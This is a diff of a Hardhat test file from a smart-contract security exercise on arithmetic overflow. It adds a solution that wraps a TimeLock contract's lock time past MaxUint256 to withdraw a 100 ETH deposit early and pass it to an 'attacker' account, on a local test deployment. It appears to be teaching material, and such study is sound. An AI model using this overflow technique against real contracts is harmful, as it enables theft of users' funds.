@@ -1,78 +1,68 @@
-import { ethers } from "hardhat";
-import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
-import { BigNumber } from "ethers";
-import { parseEther } from "ethers/lib/utils";
-import { expect } from "chai";
-import { TimeLock, TimeLock__factory } from "../../typechain-types";
+import { ethers } from 'hardhat';
+import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
+import { BigNumber } from 'ethers';
+import { parseEther } from 'ethers/lib/utils';
+import { expect } from 'chai';
+import { TimeLock, TimeLock__factory } from '../../typechain-types';
 
-describe("Arithmetic Over/Underflow Exercise 1", function () {
-    let deployer: SignerWithAddress,
-        victim: SignerWithAddress,
-        attacker: SignerWithAddress;
+describe('Arithmetic Over/Underflow Exercise 1', function () {
+	let deployer: SignerWithAddress, victim: SignerWithAddress, attacker: SignerWithAddress;
 
-    const ONE_MONTH = 30 * 24 * 60 * 60;
-    const VICTIM_DEPOSIT = parseEther("100");
+	const ONE_MONTH = 30 * 24 * 60 * 60; // 2592000 seconds
 
-    let timelock: TimeLock;
-    let attackerInitialBalance: BigNumber;
-    let victimInitialBalance: BigNumber;
+	const VICTIM_DEPOSIT = parseEther('100');
 
-    before(async function () {
-        /** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */
+	let timelock: TimeLock;
+	let attackerInitialBalance: BigNumber;
+	let victimInitialBalance: BigNumber;
 
-        [deployer, victim, attacker] = await ethers.getSigners();
-        attackerInitialBalance = await ethers.provider.getBalance(
-            attacker.address
-        );
-        victimInitialBalance = await ethers.provider.getBalance(victim.address);
+	before(async function () {
+		/** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */
 
-        const TimeLockFactory = (await ethers.getContractFactory(
-            "contracts/arithmetic-overflows-1/TimeLock.sol:TimeLock",
-            deployer
-        )) as TimeLock__factory;
+		[deployer, victim, attacker] = await ethers.getSigners();
+		attackerInitialBalance = await ethers.provider.getBalance(attacker.address);
+		victimInitialBalance = await ethers.provider.getBalance(victim.address);
 
-        timelock = await TimeLockFactory.deploy();
+		const TimeLockFactory = (await ethers.getContractFactory(
+			'contracts/arithmetic-overflows-1/TimeLock.sol:TimeLock',
+			deployer
+		)) as TimeLock__factory;
 
-        await timelock.connect(victim).depositETH({ value: VICTIM_DEPOSIT });
-        let currentBalance = await ethers.provider.getBalance(victim.address);
-        expect(currentBalance).to.be.lt(
-            victimInitialBalance.sub(VICTIM_DEPOSIT)
-        );
+		timelock = await TimeLockFactory.deploy();
 
-        let block = await ethers.provider.getBlock(
-            await ethers.provider.getBlockNumber()
-        );
-        let blockTimestmap = block.timestamp;
+		await timelock.connect(victim).depositETH({ value: VICTIM_DEPOSIT });
 
-        let victimDeposited = await timelock
-            .connect(victim)
-            .getBalance(victim.address);
-        let lockTime = await timelock
-            .connect(victim)
-            .getLockTime(victim.address);
+		let currentBalance = await ethers.provider.getBalance(victim.address);
+		expect(currentBalance).to.be.lt(victimInitialBalance.sub(VICTIM_DEPOSIT));
 
-        expect(victimDeposited).to.equal(VICTIM_DEPOSIT);
-    });
+		let block = await ethers.provider.getBlock(await ethers.provider.getBlockNumber());
+		let blockTimestamp = block.timestamp;
+		let victimDeposited = await timelock.connect(victim).getBalance(victim.address);
+		let lockTime = await timelock.connect(victim).getLockTime(victim.address);
+		expect(victimDeposited).to.equal(VICTIM_DEPOSIT);
+		expect(lockTime).to.equal(blockTimestamp + ONE_MONTH);
+	});
 
-    it("Exploit", async function () {
-        /** CODE YOUR SOLUTION HERE */
-    });
+	it('Exploit', async function () {
+		/** CODE YOUR SOLUTION HERE */
+		const maxUint256 = ethers.constants.MaxUint256;
+		await timelock.connect(victim).increaseMyLockTime(maxUint256.add(1).sub(ONE_MONTH));
+		await timelock.connect(victim).withdrawETH();
+		await victim.sendTransaction({
+			to: attacker.address,
+			value: VICTIM_DEPOSIT,
+		});
+	});
 
-    after(async function () {
-        /** SUCCESS CONDITIONS */
+	after(async function () {
+		/** SUCCESS CONDITIONS */
 
-        // Timelock contract victim's balance supposed to be 0 (withdrawn successfuly)
-        let victimDepositedAfter = await timelock
-            .connect(victim)
-            .getBalance(victim.address);
-        expect(victimDepositedAfter).to.equal(0);
+		// Timelock contract victim's balance supposed to be 0 (withdrawn successfuly)
+		let victimDepositedAfter = await timelock.connect(victim).getBalance(victim.address);
+		expect(victimDepositedAfter).to.equal(0);
 
-        // Attacker's should steal successfully the 100 ETH (-0.2 ETH becuase TX fees)
-        let attackerCurrentBalance = await ethers.provider.getBalance(
-            attacker.address
-        );
-        expect(attackerCurrentBalance).to.be.gt(
-            attackerInitialBalance.add(VICTIM_DEPOSIT).sub(parseEther("0.2"))
-        );
-    });
+		// Attacker's should steal successfully the 100 ETH (-0.2 ETH becuase TX fees)
+		let attackerCurrentBalance = await ethers.provider.getBalance(attacker.address);
+		expect(attackerCurrentBalance).to.be.gt(attackerInitialBalance.add(VICTIM_DEPOSIT).sub(parseEther('0.2')));
+	});
 });
